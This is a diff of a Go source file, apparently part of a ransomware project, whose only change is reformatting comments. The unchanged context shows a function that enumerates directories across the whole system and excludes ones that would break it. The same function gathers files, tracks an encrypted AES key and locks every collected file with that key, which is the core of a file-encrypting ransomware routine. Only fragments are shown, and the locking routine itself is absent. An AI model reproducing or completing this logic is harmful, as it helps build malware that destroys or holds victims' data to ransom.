@@ -16,7 +16,7 @@ var pl = fmt.Println
 
 func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {
 
-	//set variables
+	// set variables
 	var (
 		filesToEncrypt []string
 		// sizeOfFoundFiles int64
@@ -31,15 +31,15 @@ func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {
 	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
 	pl("dirsToScan: ", dirsToScan)
 
-	//listen for channel and append to filesToEncrypt
+	// listen for channel and append to filesToEncrypt
 	filesToEncrypt = getAllFiles(dirsToScan, encryptedAesKey)
-	//encrypt files
+	// encrypt files
 	pl("Locking...")
 	file.LockFilesArray(filesToEncrypt, aesKey)
 
 	timeEnd := time.Now()
 	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
-	//print human readable size
+	// print human readable size
 	pl("Time elapsed: ", timeEnd.Sub(timeNow))
 
 }
@@ -83,7 +83,7 @@ func goroutineScanDir(dir string, wg *sync.WaitGroup, chanFilesScanned chan<- []
 			fmt.Println("Error scanning dir: ", err)
 			wg.Done()
 		}
-		//send files to channel
+		// send files to channel
 		chanFilesScanned <- files
 
 		pl("Files found in this dir: ", humanize.Comma(int64(len(files))))
@@ -102,11 +102,11 @@ func generateListOfDirsToScan(dirsToScan []string, dirsToRemove []string) []stri
 }
 
 func removeDirsFromList(dirsToRemove []string, dirsToScan []string) []string {
-	//* Remove dirs that would break the system
+	// * Remove dirs that would break the system
 
 	dirsToReturn := []string{}
 	for _, dir := range dirsToScan {
-		//check if dir exists and add it to dirsToReturn
+		// check if dir exists and add it to dirsToReturn
 		_, err := os.Stat(dir)
 		if err == nil {
 			dirsToReturn = append(dirsToReturn, dir)
